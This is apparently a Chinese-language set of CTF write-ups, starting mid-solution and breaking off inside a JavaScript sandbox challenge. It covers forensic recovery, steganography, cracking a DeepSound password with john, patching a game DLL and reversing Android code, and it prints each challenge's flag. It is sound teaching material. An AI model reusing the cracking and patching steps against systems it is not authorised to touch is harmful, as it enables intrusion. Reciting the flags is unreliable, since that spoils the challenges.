flag = [[(3, 'm'), (4, '"'), (5, '"'), (8, '"'), (9, '"'), (10, '#'), (31, 'm'), (32, '"'), (33, '"'), (44, 'm'), (45, 'm'), (46, 'm'), (47, 'm'), (50, 'm'), (51, 'm'), (52, 'm'), (53, 'm'), (54, 'm'), (55, 'm'), (58, 'm'), (59, 'm'), (60, 'm'), (61, 'm'), (66, 'm'), (67, '"'), (68, '"'), (75, '#')], [(1, 'm'), (2, 'm'), (3, '#'), (4, 'm'), (5, 'm'), (10, '#'), (16, 'm'), (17, 'm'), (18, 'm'), (23, 'm'), (24, 'm'), (25, 'm'), (26, 'm'), (31, '#'), (37, 'm'), (38, 'm'), (39, 'm'), (43, '"'), (47, '"'), (48, '#'), (54, '#'), (55, '"'), (57, '"'), (61, '"'), (62, '#'), (64, 'm'), (65, 'm'), (66, '#'), (67, 'm'), (68, 'm'), (72, 'm'), (73, 'm'), (74, 'm'), (75, '#')], [(3, '#'), (10, '#'), (15, '"'), (19, '#'), (22, '#'), (23, '"'), (25, '"'), (26, '#'), (29, 'm'), (30, 'm'), (31, '"'), (36, '"'), (40, '#'), (47, 'm'), (48, '"'), (53, 'm'), (54, '"'), (59, 'm'), (60, 'm'), (61, 'm'), (62, '"'), (66, '#'), (71, '#'), (72, '"'), (74, '"'), (75, '#')], [(3, '#'), (10, '#'), (15, 'm'), (16, '"'), (17, '"'), (18, '"'), (19, '#'), (22, '#'), (26, '#'), (31, '#'), (36, 'm'), (37, '"'), (38, '"'), (39, '"'), (40, '#'), (45, 'm'), (46, '"'), (52, 'm'), (53, '"'), (61, '"'), (62, '#'), (66, '#'), (71, '#'), (75, '#')], [(3, '#'), (10, '"'), (11, 'm'), (12, 'm'), (15, '"'), (16, 'm'), (17, 'm'), (18, '"'), (19, '#'), (22, '"'), (23, '#'), (24, 'm'), (25, '"'), (26, '#'), (31, '#'), (36, '"'), (37, 'm'), (38, 'm'), (39, '"'), (40, '#'), (43, 'm'), (44, '#'), (45, 'm'), (46, 'm'), (47, 'm'), (48, 'm'), (51, 'm'), (52, '"'), (57, '"'), (58, 'm'), (59, 'm'), (60, 'm'), (61, '#'), (62, '"'), (66, '#'), (71, '"'), (72, '#'), (73, 'm'), (74, '#'), (75, '#')], [(23, 'm'), (26, '#'), (32, '"'), (33, '"')], [(24, '"'), (25, '"')], [], [(12, '#'), (17, 'm'), (18, '"'), (19, '"'), (23, 'm'), (24, 'm'), (25, 'm'), (26, 'm'), (33, '#'), (36, 'm'), (37, 'm'), (38, 'm'), (39, 'm'), (40, 'm'), (41, 'm'), (46, 'm'), (47, 'm'), (52, 'm'), (53, 'm'), (54, 'm'), (65, 'm'), (66, 'm'), (67, 'm'), (68, 'm'), (71, 'm'), (72, 'm'), (73, 'm'), (74, 'm'), (75, 'm'), (76, 'm')], [(2, 'm'), (3, 'm'), (4, 'm'), (9, 'm'), (10, 'm'), (11, 'm'), (12, '#'), (15, 'm'), (16, 'm'), (17, '#'), (18, 'm'), (19, 'm'), (22, '"'), (26, '"'), (27, '#'), (30, 'm'), (31, 'm'), (32, 'm'), (33, '#'), (40, '#'), (41, '"'), (45, 'm'), (46, '"'), (47, '#'), (50, 'm'), (51, '"'), (55, '"'), (58, 'm'), (59, 'm'), (60, 'm'), (64, '#'), (65, '"'), (68, '"'), (69, 'm'), (75, '#'), (76, '"')], [(1, '#'), (2, '"'), (5, '#'), (8, '#'), (9, '"'), (11, '"'), (12, '#'), (17, '#'), (24, 'm'), (25, 'm'), (26, 'm'), (27, '"'), (29, '#'), (30, '"'), (32, '"'), (33, '#'), (39, 'm'), (40, '"'), (44, '#'), (45, '"'), (47, '#'), (50, '#'), (51, 'm'), (52, '"'), (53, '"'), (54, '#'), (55, 'm'), (57, '#'), (58, '"'), (61, '#'), (64, '#'), (65, 'm'), (68, 'm'), (69, '#'), (74, 'm'), (75, '"')], [(1, '#'), (2, '"'), (3, '"'), (4, '"'), (5, '"'), (8, '#'), (12, '#'), (17, '#'), (26, '"'), (27, '#'), (29, '#'), (33, '#'), (38, 'm'), (39, '"'), (43, '#'), (44, 'm'), (45, 'm'), (46, 'm'), (47, '#'), (48, 'm'), (50, '#'), (55, '#'), (57, '#'), (58, '"'), (59, '"'), (60, '"'), (61, '"'), (65, '"'), (66, '"'), (67, '"'), (69, '#'), (73, 'm'), (74, '"')], [(1, '"'), (2, '#'), (3, 'm'), (4, 'm'), (5, '"'), (8, '"'), (9, '#'), (10, 'm'), (11, '#'), (12, '#'), (17, '#'), (22, '"'), (23, 'm'), (24, 'm'), (25, 'm'), (26, '#'), (27, '"'), (29, '"'), (30, '#'), (31, 'm'), (32, '#'), (33, '#'), (37, 'm'), (38, '"'), (47, '#'), (51, '#'), (52, 'm'), (53, 'm'), (54, '#'), (55, '"'), (57, '"'), (58, '#'), (59, 'm'), (60, 'm'), (61, '"'), (64, '"'), (65, 'm'), (66, 'm'), (67, 'm'), (68, '"'), (72, 'm'), (73, '"')], [], [], [], [(5, '#'), (8, '#'), (16, 'm'), (17, 'm'), (18, 'm'), (19, 'm'), (23, 'm'), (24, 'm'), (25, 'm'), (26, 'm'), (30, 'm'), (31, 'm'), (32, 'm'), (33, 'm'), (38, 'm'), (39, 'm'), (40, 'm'), (50, '#'), (57, '#'), (64, '#'), (71, 'm'), (72, 'm'), (73, 'm')], [(2, 'm'), (3, 'm'), (4, 'm'), (5, '#'), (8, '#'), (9, 'm'), (10, 'm'), (11, 'm'), (15, '#'), (16, '"'), (19, '"'), (20, 'm'), (22, 'm'), (23, '"'), (26, '"'), (27, 'm'), (29, '#'), (34, '#'), (36, 'm'), (37, '"'), (41, '"'), (44, 'm'), (45, 'm'), (46, 'm'), (50, '#'), (51, 'm'), (52, 'm'), (53, 'm'), (57, '#'), (58, 'm'), (59, 'm'), (60, 'm'), (64, '#'), (65, 'm'), (66, 'm'), (67, 'm'), (73, '#')], [(1, '#'), (2, '"'), (4, '"'), (5, '#'), (8, '#'), (9, '"'), (11, '"'), (12, '#'), (15, '#'), (16, 'm'), (19, 'm'), (20, '#'), (22, '#'), (25, 'm'), (27, '#'), (29, '"'), (30, 'm'), (31, 'm'), (32, 'm'), (33, 'm'), (34, '"'), (36, '#'), (37, 'm'), (38, '"'), (39, '"'), (40, '#'), (41, 'm'), (43, '#'), (44, '"'), (47, '#'), (50, '#'), (51, '"'), (53, '"'), (54, '#'), (57, '#'), (58, '"'), (60, '"'), (61, '#'), (64, '#'), (65, '"'), (67, '"'), (68, '#'), (73, '#')], [(1, '#'), (5, '#'), (8, '#'), (12, '#'), (16, '"'), (17, '"'), (18, '"'), (20, '#'), (22, '#'), (27, '#'), (29, '#'), (33, '"'), (34, '#'), (36, '#'), (41, '#'), (43, '#'), (44, '"'), (45, '"'), (46, '"'), (47, '"'), (50, '#'), (54, '#'), (57, '#'), (61, '#'), (64, '#'), (68, '#'), (73, '#')], [(1, '"'), (2, '#'), (3, 'm'), (4, '#'), (5, '#'), (8, '#'), (9, '#'), (10, 'm'), (11, '#'), (12, '"'), (15, '"'), (16, 'm'), (17, 'm'), (18, 'm'), (19, '"'), (23, '#'), (24, 'm'), (25, 'm'), (26, '#'), (29, '"'), (30, '#'), (31, 'm'), (32, 'm'), (33, 'm'), (34, '"'), (37, '#'), (38, 'm'), (39, 'm'), (40, '#'), (41, '"'), (43, '"'), (44, '#'), (45, 'm'), (46, 'm'), (47, '"'), (50, '#'), (51, '#'), (52, 'm'), (53, '#'), (54, '"'), (57, '#'), (58, '#'), (59, 'm'), (60, '#'), (61, '"'), (64, '#'), (65, '#'), (66, 'm'), (67, '#'), (68, '"'), (71, 'm'), (72, 'm'), (73, '#'), (74, 'm'), (75, 'm')], [], [], [], [(2, 'm'), (3, 'm'), (4, 'm'), (5, 'm'), (8, 'm'), (9, 'm'), (10, 'm'), (11, 'm'), (12, 'm'), (19, '#'), (24, 'm'), (25, 'm'), (26, 'm'), (29, '"'), (30, '"'), (31, 'm')], [(1, '#'), (2, '"'), (5, '"'), (6, 'm'), (8, '#'), (16, 'm'), (17, 'm'), (18, 'm'), (19, '#'), (22, 'm'), (23, '"'), (27, '"'), (31, '#')], [(1, '#'), (2, 'm'), (5, 'm'), (6, '#'), (8, '"'), (9, '"'), (10, '"'), (11, '"'), (12, 'm'), (13, 'm'), (15, '#'), (16, '"'), (18, '"'), (19, '#'), (22, '#'), (23, 'm'), (24, '"'), (25, '"'), (26, '#'), (27, 'm'), (31, '"'), (32, 'm'), (33, 'm')], [(2, '"'), (3, '"'), (4, '"'), (6, '#'), (13, '#'), (15, '#'), (19, '#'), (22, '#'), (27, '#'), (31, '#')], [(1, '"'), (2, 'm'), (3, 'm'), (4, 'm'), (5, '"'), (8, '"'), (9, 'm'), (10, 'm'), (11, 'm'), (12, '#'), (13, '"'), (15, '"'), (16, '#'), (17, 'm'), (18, '#'), (19, '#'), (23, '#'), (24, 'm'), (25, 'm'), (26, '#'), (27, '"'), (31, '#')], [(29, '"'), (30, '"')]]
temp = [' '] * 76
for line, data in enumerate(flag):
    if not data:
        print()
    else:
        for t in data:
            try:
                temp[t[0]] = t[1]
            except Exception:
                pass
 
    print(''.join(temp))
 
    temp = [' '] * 76
 
```

可以得到如下内容。

```text
   m""  ""#                    m""          mmmm  mmmmmm  mmmm    m""      # 
 mm#mm    #     mmm    mmmm    #     mmm   "   "#     #" "   "# mm#mm   mmm# 
   #      #    "   #  #" "#  mm"    "   #      m"    m"    mmm"   #    #" "# 
   #      #    m"""#  #   #    #    m"""#    m"     m"       "#   #    #   # 
   #      "mm  "mm"#  "#m"#    #    "mm"#  m#mmmm  m"    "mmm#"   #    "#m## 
                       m  #     ""                                           
                        ""                                                   

            #    m""   mmmm      #  mmmmmm    mm    mmm          mmmm  mmmmmm
  mmm    mmm#  mm#mm  "   "#  mmm#      #"   m"#  m"   "  mmm   #"  "m     #"
 #"  #  #" "#    #      mmm" #" "#     m"   #" #  #m""#m #"  #  #m  m#    m" 
 #""""  #   #    #        "# #   #    m"   #mmm#m #    # #""""   """ #   m"  
 "#mm"  "#m##    #    "mmm#" "#m##   m"        #   #mm#" "#mm"  "mmm"   m"   



     #  #       mmmm   mmmm   mmmm    mmm         #      #      #      mmm   
  mmm#  #mmm   #"  "m m"  "m #    # m"   "  mmm   #mmm   #mmm   #mmm     #   
 #" "#  #" "#  #m  m# #  m # "mmmm" #m""#m #"  #  #" "#  #" "#  #" "#    #   
 #   #  #   #   """ # #    # #   "# #    # #""""  #   #  #   #  #   #    #   
 "#m##  ##m#"  "mmm"   #mm#  "#mmm"  #mm#" "#mm"  ##m#"  ##m#"  ##m#"  mm#mm 



  mmmm  mmmmm      #    mmm  ""m                                             
 #"  "m #       mmm#  m"   "   #                                             
 #m  m# """"mm #" "#  #m""#m   "mm                                           
  """ #      # #   #  #    #   #                                             
 "mmm"  "mmm#" "#m##   #mm#"   #                                             
                             ""
flag{a273fdedf3d746e97db9086ebbb195d6}
```

### [XMAN2018排位赛]file

附件给出的是一个镜像，使用 DiskInternals Linux Reader 挂载打开可以发现一个 lost+found 文件夹，说明存在可能可恢复的文件数据碎片。

![img](assets/aeb98a6abe4ae41863cd31308b14def3.png)

使用 `extundelete attachment.img --restore-all` 尝试恢复即可得到一个 Vim 的 swp 文件。将其恢复后整理可得 flag。

```flag
flag{fugly_cats_need_luv_2}
```

### [HDCTF2019]信号分析

> 使用HackCube-Special分析固定码信号：https://www.freebuf.com/articles/wireless/191534.html

将附件使用 Audition 打开可以看到如下重复波形。

![img](assets/880cb2e6b8e8fb0b5c40888cf06a5856.png)

根据参考文章的如下图片可以尝试解码。

![img](assets/97c5fcfbcb3c08a43b09e466dacd7135.png)

根据图片规律可解码得到 `FFFFFFFF0001`。

```flag
flag{FFFFFFFF0001}
```

### [De1CTF2019]Mine Sweeping

解压附件可得到一个游戏，使用 dnSpy 查看 `Assembly-CSharp.dll` 可以找到 `OnMouseUpAsButton()` 方法，其中存在着判断每次点击是否“踩雷”的操作。要完成游戏只需要点开所有方块即可，因此只需要把“踩雷”去掉。将原有的代码修改如下。

```c#
// Elements
// Token: 0x0600000A RID: 10
private void OnMouseUpAsButton()
{
    if (!Grids._instance.bGameEnd && !this.bIsOpen)
    {
        this.bIsOpen = true;
        int num = (int)base.transform.position.x;
        int num2 = (int)base.transform.position.y;
        int adjcent = Grids._instance.CountAdjcentNum(num, num2);
        this.SafeAndThunder(adjcent);
        Grids._instance.Flush(num, num2, new bool[29, 29]);
        if (Grids._instance.GameWin())
        {
            Grids._instance.bGameEnd = true;
            MonoBehaviour.print("game over: win");
        }
    }
}
```

编译后保存，再次打开游戏并点开所有方块即可得到如下二维码。

![img](assets/735640248603cdf8ffd6f23edf22d34d.png)

扫描二维码可得到 `http://qr02.cn/FeJ7dU`，访问即可获得 flag。

```flag
de1ctf{G3t_F1@g_AFt3R_Sw3ep1ng_M1n3s}
```

### [INSHack2018](not) so deep

使用 Audition 打开附件可以发现半个 flag。

![img](assets/c7de4b6373e6b4e7cea3fa86907c899d.png)

根据其中含有的 st3G4n 推测是隐写，同时题目中有 deep，考虑是 DeepSound。但是没有给出 key，因此尝试使用 john 自带的 deepsound2john.py 来得到 hash 值从而爆破 key。

```bash
> python .\run\deepsound2john.py .\final_flag.wav
final_flag.wav:$dynamic_1529$b8f858d9deb0b805797cef03299e3bdd8990f48a
```

使用 john 爆破可以得到如下结果。

```text
azerty           (final_flag.wav)
```

因此得到了 key 为 azerty。使用 DeepSound 配合 key 解密可得一个文件。

![img](assets/57ea50e9abccf3fdd2b3ea368e8bcf45.png)

提取出 flag2.txt 可得后一半 flag `0_1s_4lwayS_Th3_S4me}`。

```flag
INSA{Aud1o_st3G4n0_1s_4lwayS_Th3_S4me}
```

### [BSidesSF2019]diskimage

附件是一张图片，上半部分显示不正常，考虑有隐写。

![img](assets/253c279fffc6b83b62b6a9b16d9884d1.png)

在 zsteg 的报告下有如下信息。

```text
b8,rgb,lsb,xy       .. file: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID "~mitsumi", root entries 224, sectors 2880 (volumes <=32 MB) , sectors/FAT 9, sectors/track 18, serial number 0x7e572f0f, unlabeled, FAT (12 bit)
```

将文件提取出来 `zsteg -e 'b8,rgb,lsb,xy' attachment.png  > extracted.dat`，可以得到一个软盘数据文件。使用 testdisk 指令尝试恢复被删除的文件。

![img](assets/e41ef612222ce82a3a649754c8b6e514.png)

![img](assets/2e3f38f356174423fa78523d4927fcf7.png)

在此界面时按 c 将文件拷贝到软盘数据文件的目录下。恢复得到的 `_LAG.ICO` 如下。

![img](assets/0bf1f555bb6dd07f7cf939aaddaa4113.png)

```flag
CTF{FAT12_FTW}
```

### [BSidesSF2020]barcoder

画图一把梭修复条形码，得到如下图片。

![img](assets/0e149a5eb86f8d4404bdc3823990c7b3.png)

使用 bcTester 扫描条形码可得 flag。

![img](assets/5c28347ee3323473d28cab725db8eb42.png)

```flag
CTF{way_too_common}
```

### [CFI-CTF 2018]Kadyrov's Cat

> A man from the soviet union has sent you two strange documents. Find the identity of the man as well as his location.
>
> Flag format is : `CFI{Firstname_Lastname_of_City}`

附件中的图片有经纬度。

![img](assets/9ba7a6bfdc8262155a9ccffc41924db8.png)

稍微计算一下可以得到如下结果。

![img](assets/52ef53e5ff9d735242522c615a1b74df.png)

使用地图可以得到地址 `Uzvaras bulvāris, Centra rajons, Rīga, LV-1050, Latvia`，因此城市是 Riga。

使用 Acrobat DC 打开附件给出的 PDF 文件可得如下内容。

![img](assets/d134d42d8c7a2b20180205477126ae7a.png)

```flag
CFI{Kotik_Kadyrov_of_Riga}
```

### Weird_List

附件给出的是一堆数据，推测其构成了一幅图片。因此写个脚本将数据画出来。

```python
import PIL

pixels = [[120], [120], [24, 1, 87, 1, 7], [7, 1, 15, 1, 21, 1, 16, 1, 49, 1, 7], [2, 1, 1, 1, 2, 1, 15, 1, 4, 1, 3, 1, 1, 1, 10, 1, 16, 1, 4, 1, 1, 1, 2, 1, 1, 1, 19, 1, 7, 1, 1, 1, 2, 1, 1, 1, 3, 1, 6], [2, 1, 1, 1, 3, 1, 14, 1, 3, 1, 1, 1, 2, 1, 1, 1, 10, 1, 16, 1, 4, 1, 1, 1, 2, 1, 1, 1, 18, 1, 8, 1, 1, 1, 2, 1, 1, 1, 4, 1, 5], [2, 1, 1, 1, 3, 1, 14, 1, 3, 1, 1, 1, 2, 1, 1, 1, 10, 1, 16, 1, 4, 1, 1, 1, 2, 1, 1, 1, 17, 1, 1, 1, 7, 1, 1, 1, 2, 1, 1, 1, 4, 1, 5], [2, 1, 5, 1, 14, 1, 3, 1, 1, 1, 4, 1, 10, 1, 16, 1, 7, 1, 4, 1, 16, 1, 1, 1, 7, 1, 2, 1, 4, 1, 3, 1, 5], [2, 1, 5, 1, 14, 1, 3, 1, 2, 1, 4, 1, 9, 1, 16, 1, 7, 1, 4, 1, 16, 1, 1, 1, 10, 1, 4, 1, 3, 1, 5], [2, 1, 5, 1, 3, 1, 1, 1, 2, 1, 5, 1, 3, 1, 2, 1, 4, 1, 1, 1, 5, 1, 1, 1, 2, 1, 9, 1, 3, 1, 2, 1, 4, 1, 4, 1, 1, 1, 1, 1, 7, 1, 1, 1, 4, 1, 3, 1, 6, 1, 4, 1, 3, 1, 5], [2, 1, 5, 1, 3, 1, 1, 1, 2, 1, 1, 1, 3, 1, 3, 1, 2, 1, 3, 1, 2, 1, 4, 1, 1, 1, 2, 1, 1, 1, 7, 1, 1, 1, 2, 1, 1, 1, 5, 1, 4, 1, 1, 1, 1, 1, 7, 1, 1, 1, 4, 1, 3, 1, 1, 1, 4, 1, 4, 1, 3, 1, 5], [2, 1, 5, 1, 3, 1, 1, 1, 2, 1, 1, 1, 3, 1, 3, 1, 2, 1, 3, 1, 2, 1, 4, 1, 1, 1, 2, 1, 9, 1, 4, 1, 1, 1, 5, 1, 3, 1, 2, 1, 2, 1, 6, 1, 2, 1, 3, 1, 2, 1, 2, 1, 4, 1, 4, 1, 3, 1, 5], [2, 1, 1, 1, 3, 1, 5, 1, 2, 1, 1, 1, 3, 1, 3, 1, 2, 1, 2, 1, 8, 1, 1, 1, 2, 1, 9, 1, 4, 1, 1, 1, 4, 1, 3, 1, 6, 1, 6, 1, 2, 1, 3, 1, 2, 1, 2, 1, 4, 1, 2, 1, 5, 1, 5], [2, 1, 1, 1, 3, 1, 6, 1, 1, 1, 1, 1, 2, 1, 4, 1, 1, 1, 3, 1, 3, 1, 4, 1, 1, 1, 2, 1, 9, 1, 4, 1, 1, 1, 4, 1, 3, 1, 6, 1, 6, 1, 2, 1, 3, 1, 2, 1, 2, 1, 3, 1, 3, 1, 5, 1, 5], [2, 1, 5, 1, 6, 1, 1, 1, 4, 1, 4, 1, 1, 1, 3, 1, 3, 1, 4, 1, 2, 1, 1, 1, 9, 1, 4, 1, 6, 1, 3, 1, 6, 1, 6, 1, 2, 1, 3, 1, 2, 1, 2, 1, 3, 1, 3, 1, 1, 1, 4, 1, 4], [2, 1, 5, 1, 3, 1, 1, 1, 2, 1, 4, 1, 4, 1, 1, 1, 4, 1, 2, 1, 4, 1, 2, 1, 1, 1, 9, 1, 4, 1, 6, 1, 4, 1, 3, 1, 1, 1, 6, 1, 2, 1, 3, 1, 2, 1, 2, 1, 3, 1, 5, 1, 3, 1, 5], [2, 1, 5, 1, 3, 1, 1, 1, 2, 1, 5, 1, 3, 1, 1, 1, 5, 1, 2, 1, 3, 1, 2, 1, 2, 1, 9, 1, 3, 1, 1, 1, 3, 1, 6, 1, 1, 1, 1, 1, 7, 1, 2, 1, 3, 1, 2, 1, 2, 1, 3, 1, 5, 1, 3, 1, 5], [2, 1, 5, 1, 3, 1, 2, 1, 1, 1, 5, 1, 4, 1, 1, 1, 4, 1, 1, 1, 4, 1, 2, 1, 2, 1, 9, 1, 3, 1, 1, 1, 3, 1, 6, 1, 1, 1, 2, 1, 6, 1, 2, 1, 3, 1, 2, 1, 2, 1, 2, 1, 6, 1, 3, 1, 5], [2, 1, 5, 1, 3, 1, 2, 1, 1, 1, 5, 1, 6, 1, 4, 1, 6, 1, 2, 1, 3, 1, 9, 1, 2, 1, 1, 1, 3, 1, 6, 1, 1, 1, 2, 1, 6, 1, 2, 1, 3, 1, 2, 1, 2, 1, 2, 1, 6, 1, 3, 1, 5], [2, 1, 5, 1, 3, 1, 1, 1, 2, 1, 1, 1, 3, 1, 6, 1, 4, 1, 1, 1, 4, 1, 2, 1, 4, 1, 9, 1, 1, 1, 1, 1, 3, 1, 6, 1, 1, 1, 2, 1, 6, 1, 2, 1, 3, 1, 2, 1, 2, 1, 2, 1, 6, 1, 3, 1, 5], [2, 1, 5, 1, 3, 1, 1, 1, 2, 1, 1, 1, 3, 1, 5, 1, 5, 1, 6, 1, 1, 1, 5, 1, 9, 1, 1, 1, 1, 1, 2, 1, 7, 1, 1, 1, 2, 1, 6, 1, 2, 1, 3, 1, 2, 1, 2, 1, 1, 1, 7, 1, 3, 1, 5], [2, 1, 5, 1, 3, 1, 1, 1, 2, 1, 1, 1, 3, 1, 5, 1, 4, 1, 2, 1, 1, 1, 2, 1, 1, 1, 17, 1, 2, 1, 1, 1, 6, 1, 2, 1, 1, 1, 7, 1, 2, 1, 3, 1, 2, 1, 2, 1, 1, 1, 4, 1, 2, 1, 3, 1, 5], [2, 1, 5, 1, 1, 1, 1, 1, 1, 1, 2, 1, 1, 1, 3, 1, 3, 1, 1, 1, 2, 1, 1, 1, 2, 1, 1, 1, 2, 1, 1, 1, 2, 1, 1, 1, 7, 1, 1, 1, 2, 1, 2, 1, 1, 1, 1, 1, 2, 1, 1, 1, 2, 1, 1, 1, 7, 1, 1, 1, 3, 1, 1, 1, 1, 1, 1, 1, 2, 1, 1, 1, 2, 1, 1, 1, 4, 1, 5], [2, 1, 6, 1, 2, 1, 2, 1, 1, 1, 5, 1, 3, 1, 1, 1, 2, 1, 1, 1, 2, 1, 1, 1, 2, 1, 1, 1, 2, 1, 1, 1, 7, 1, 1, 1, 2, 1, 2, 1, 1, 1, 1, 1, 2, 1, 1, 1, 2, 1, 1, 1, 7, 1, 1, 1, 3, 1, 1, 1, 2, 1, 3, 1, 1, 1, 2, 1, 1, 1, 4, 1, 5], [12, 1, 5, 1, 4, 1, 4, 1, 3, 1, 10, 1, 4, 1, 9, 1, 14, 1, 4, 1, 8, 1, 1, 1, 8, 1, 9, 1, 4, 1, 6], [19, 1, 4, 1, 62, 1, 24, 1, 7], [19, 1, 4, 1, 62, 1, 24, 1, 7], [17, 1, 1, 1, 31, 1, 1, 1, 1, 1, 25, 1, 1, 1, 1, 1, 1, 1, 32], [17, 1, 1, 1, 31, 1, 1, 1, 1, 1, 25, 1, 1, 1, 1, 1, 1, 1, 32], [17, 1, 1, 1, 67, 1, 32], [120], [21, 1, 1, 1, 1, 1, 86, 1, 1, 1, 1, 1, 3], [120], [120]]
img = PIL.Image.new("RGB", (120, 35), "white")

column, row = 0, 0

for pixelLine in pixels:
    for pixel in pixelLine:
        if pixel > 1:
            column += pixel
        else:
            img.putpixel((int(column), int(row)), (16, 63, 145))
            column += 1
    row += 1
    column = 0

img.save("result.png")
```

运行脚本可以得到如下图片。

![img](assets/4c65ccff8ac12ad58cff2dd09a8f9a33.png)

```flag
Flag{93ids_sk23a_p1o23}
```

### [NPUCTF2020]回收站

AccessData FTK Imager 挂载附件给出的磁盘，在 `X:\Windows\Web\Wallpaper\Windows` 下可以找到 flag。除此之外，回收站内也有部分 flag 但是并不完整。

![img](assets/17f03a25eb3acde36414cd6b756ef286.png)

```flag
flag{e10adc3949ba59abbe56e057f20f883e}
```

### [INSHack2018]42.tar.xz

套娃解压压缩包即可得到 flag。

![img](assets/d121c3e76f3f518b4c865c76fbc32b19.png)

也可以脚本一把梭。

```sh
while [ "`find . -type f -name '*.tar.xz' | wc -l`" -gt 0 ]; 
do find -type f -name "*.tar.xz" -exec tar xf '{}' \; -exec rm -- '{}' \;; 
done;
INSA{04ebb0d6a87f9771f2eea4dce5b91a85e7623c13301a8007914085a91b3ca6d9}
```

### [SWPU2019]Android1

解压文件之后发现一个库，使用 IDA 打开可以发现四个奇怪的函数，其代码整理后如下。

```c
char *aa(void)
{
  char *result; // rax
  signed int i; // [rsp+Ch] [rbp-14h]
  char v2[3]; // [rsp+11h] [rbp-Fh]
  int v3; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v3 = 'R_C';
  for ( i = 0; i < 3; ++i )
    v2[i] = *((_BYTE *)&v3 + i) ^ 0x37;
  result = v2;
  if ( __readfsqword(0x28u) == v4 )
    result = v2;
  return result;
}

char *aA(void)
{
  char *result; // rax
  signed int i; // [rsp+Ch] [rbp-14h]
  char v2[3]; // [rsp+11h] [rbp-Fh]
  int v3; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v3 = 'AVE';
  for ( i = 0; i < 3; ++i )
    v2[i] = *((_BYTE *)&v3 + i) ^ 0x24;
  result = v2;
  if ( __readfsqword(0x28u) == v4 )
    result = v2;
  return result;
}

char *Aa(void)
{
  char *result; // rax
  signed int i; // [rsp+Ch] [rbp-14h]
  char v2[3]; // [rsp+11h] [rbp-Fh]
  int v3; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v3 = 'MWa';
  for ( i = 0; i < 3; ++i )
    v2[i] = *((_BYTE *)&v3 + i) ^ 0x38;
  result = v2;
  if ( __readfsqword(0x28u) == v4 )
    result = v2;
  return result;
}

char *AA(void)
{
  char *result; // rax
  signed int i; // [rsp+Ch] [rbp-14h]
  char v2[3]; // [rsp+10h] [rbp-10h]
  int v3; // [rsp+13h] [rbp-Dh]
  char v4; // [rsp+17h] [rbp-9h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v3 = '#$D5';
  v4 = 0;
  for ( i = 0; i < 4; ++i )
    v2[i] = *((_BYTE *)&v3 + i) ^ 0x77;
  result = v2;
  if ( __readfsqword(0x28u) == v5 )
    result = v2;
  return result;
}
```

写个脚本跑出结果。

```c
#include <iostream>
using namespace std;

int main(){
    string aa = "R_C"; //0x37
    string aA = "AVE"; //0x24
    string Aa = "MWa"; //0x38
    string AA = "#$D5"; //0x77
    string result = "";
    for(char c : AA){
        result += c ^ 0x77;
    }
    for(char c : aa){
        result += c ^ 0x37;
    }
    for(char c : aA){
        result += c ^ 0x24;
    }
    for(char c : Aa){
        result += c ^ 0x38;
    }
    reverse(result.begin(),result.end());
    cout << result;
}
```

得到 flag。

```flag
flag{YouaretheB3ST}
```

### [BSidesSF2020]toast-clicker1

使用 jadx 反编译附件可得到如下代码。

```java
int[] input = {67, 83, 68, 120, 62, 109, 95, 90, 92, 112, 85, 73, 99, 82, 53, 99, 101, 92, 80, 89, 81, 104};
public String printfirstFlag() {
    String output = BuildConfig.FLAVOR;
    int i = 0;
    while (true) {
        int[] iArr = this.input;
        if (i >= iArr.length) {
            return output;
        }
        output = output + Character.toString((char) (iArr[i] + i));
        i++;
    }
}
```

写个脚本把上述代码复刻一遍，得到 flag。

```python
input = [67, 83, 68, 120, 62, 109, 95, 90, 92, 112, 85, 73, 99, 82, 53, 99, 101, 92, 80, 89, 81, 104]
output = ""
for x in range(len(input)):
    output += chr(x + input[x])
print(output)
CTF{Bready_To_Crumble}
```

### [*CTF2019]babyflash

JPEXS Free Flash Decompiler 反编译一下 swf 文件可以得到 441 张图片，这个数量正好是 21 的平方，考虑一下是二维码。

![img](assets/8978bf967223d59eae49c55ca3ad7831.png)

将所有图片文件名使用 `dir /b` 提取出来并排好序，然后使用指令 `for /f "skip=1" %%a in (files.txt) do certutil -hashfile %%a MD5>>md5.txt` 计算出图片的 MD5。补全第一个图片的 MD5 后整理可得如下内容。

```text
111111100110001111111100000100111001000001101110101011001011101101110100100101011101101110100101101011101100000100110001000001111111101010101111111000000001010100000000111011111011111000100110110011011101111011101101111001101111011010010001100000000011111010100000100011000000000001011100110011111111101011100110101100000101101000100010101110101011011000001101110100101101110000101110101101110110001100000101011100010010111111101101100001011
```

可使用如下 receipt 得到前半段 flag。

```text
Find_/_Replace({'option':'Regex','string':'0'},'\\xFF',true,false,true,false)
Find_/_Replace({'option':'Regex','string':'1'},'\\x00',true,false,true,false)
Generate_Image('Greyscale',12,21)
Parse_QR_Code(false)
*ctf{half_flag_&
```

将 swf 文件中的音频也导出，使用 Audition 打开后可看到如下内容。

![img](assets/83138923b27307ea3b59cb60af205106.png)

得到 flag。

```flag
*ctf{half_flag_&&_the_rest}
- *ctf{half_flag_&&_the_rest} // original
+ flag{halfflag&&_the_rest} // flag for BUUOJ
```

### [INSHack2018]GCorp - Stage 1

使用 Wireshark 分析流量包，跟踪 TCP 流，可以在最后找到如下信息。

![img](assets/f32cfcfccd53c8b0267c32e92e582b89.png)

```text
SU5TQXtjMTgwN2EwYjZkNzcxMzI3NGQ3YmYzYzY0Nzc1NjJhYzQ3NTcwZTQ1MmY3N2I3ZDIwMmI4MWUxNDkxNzJkNmE3fQ==
```

将其 Base64 解码一次即可得到 flag。

```flag
INSA{c1807a0b6d7713274d7bf3c6477562ac47570e452f77b7d202b81e149172d6a7}
```

### [HarekazeCTF2019]A_Z

`/source`  页面中可以找到如下关键代码片段。

```javascript
app.get('/', function (req, res, next) {
  let output = '';
  const code = req.query.code + '';
  if (code && code.length < 200 && !/[^a-z().]/.test(code)) {
    try {
      const result = vm.runInNewContext(code, {}, { timeout: 500 });
      if (result === 1337) {
        output = process.env.FLAG;
      } else {
        output = 'nope';
      }
    } catch (e) {
      output = 'nope';
    }
  } else {
